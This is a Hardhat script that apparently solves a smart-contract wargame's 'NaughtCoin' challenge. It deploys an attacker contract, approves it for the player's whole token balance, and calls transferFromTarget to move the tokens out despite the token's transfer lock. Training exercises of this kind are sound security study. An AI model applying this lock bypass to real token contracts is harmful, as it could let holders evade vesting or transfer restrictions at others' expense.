import {ethers} from "hardhat"
import dotenv from 'dotenv'
import type {NaughtCoin} from "../typechain-types";

dotenv.config()

async function main() {
    const isLocalTest = false
    let target: NaughtCoin

    const [deployer] = await ethers.getSigners()
    if (isLocalTest) {
        target = await ethers.deployContract('NaughtCoin', [deployer.address])
    } else {
        target = await ethers.getContractAt('NaughtCoin', process.env.TARGET_ADDRESS_16!)
    }

    const attacker = await ethers.deployContract('AttackNaughtCoin', [target.target])

    // deployer
    const value = await target.balanceOf(deployer.address)

    console.log(`balance before attack: ${value}`)
    // attack
    // approve
    await target.approve(attacker.target, value)
    await attacker.transferFromTarget(value)
    console.log(`balance after attack: ${await target.balanceOf(deployer.address)}`)
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});
